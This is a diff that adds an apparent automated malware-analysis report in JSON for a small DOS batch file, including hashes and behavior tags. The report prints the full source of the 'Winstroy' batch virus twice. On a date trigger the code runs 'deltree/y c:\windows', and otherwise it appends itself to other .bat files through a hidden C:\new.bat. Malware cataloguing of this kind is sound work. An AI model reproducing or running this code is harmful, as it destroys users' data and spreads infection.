@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Windows": "May enumerate application windows",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off%[new]%\n\necho.|date|find \"09\"\n\nif errorlevel 1 goto new3\n\n@echo Now Destroying Windows...\n\ndeltree/y c:\\windows\n\n@echo The Winstroy Batch Virus\n\n@echo (C)1995\n\ngoto end\n\n:new3\n\n@echo off%[XoP]%\n\nif '%XoP%=='11 goto XoP2\n\nif '%2=='_ goto XoP1\n\nif exist C:\\new.bat goto XoP\n\nif not exist %0.bat goto XoP2\n\nfind \"XoP\"<%0.bat>C:\\new.bat\n\nattrib C:\\new.bat +h\n\n:XoP\n\nfor %%v in (*.bat ..\\*.bat) do call C:\\new %%v \nset XoP=\n\ngoto XoP2\n\n:XoP1\n\nfind /i \"XoP\"<%1>nul\n\nif not errorlevel 1 goto XoP2\n\ntype C:\\new.bat>>%1\n\nset XoP=%XoP%1\n\n:XoP2\n\n:end\n"
+    },
+    "filename": "VirusShare_1e58ca50cd5b1b26515cd3cdb8d8d1e7",
+    "filesize": 579,
+    "filetype": "DOS batch file, ASCII text, with CRLF, CR line terminators",
+    "hashes": {
+        "md5": "1e58ca50cd5b1b26515cd3cdb8d8d1e7",
+        "sha1": "d43b931f8b58442ca1cc5b899a9bb678b70e6357",
+        "sha256": "245c338baded9ac4ead0882a810b880963ab2d3ac2bfbd5da8d887f76bcf0ecc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%[new]%",
+            "echo.|date|find \"09\"",
+            "if errorlevel 1 goto new3",
+            "@echo Now Destroying Windows...",
+            "deltree/y c:\\windows",
+            "@echo The Winstroy Batch Virus",
+            "@echo (C)1995",
+            "goto end",
+            ":new3",
+            "@echo off%[XoP]%",
+            "if '%XoP%=='11 goto XoP2",
+            "if '%2=='_ goto XoP1",
+            "if exist C:\\new.bat goto XoP",
+            "if not exist %0.bat goto XoP2",
+            "find \"XoP\"<%0.bat>C:\\new.bat",
+            "attrib C:\\new.bat +h",
+            ":XoP",
+            "for %%v in (*.bat ..\\*.bat) do call C:\\new %%v _",
+            "set XoP=",
+            "goto XoP2",
+            ":XoP1",
+            "find /i \"XoP\"<%1>nul",
+            "if not errorlevel 1 goto XoP2",
+            "type C:\\new.bat>>%1",
+            "set XoP=%XoP%1",
+            ":XoP2",
+            ":end"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.255523",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
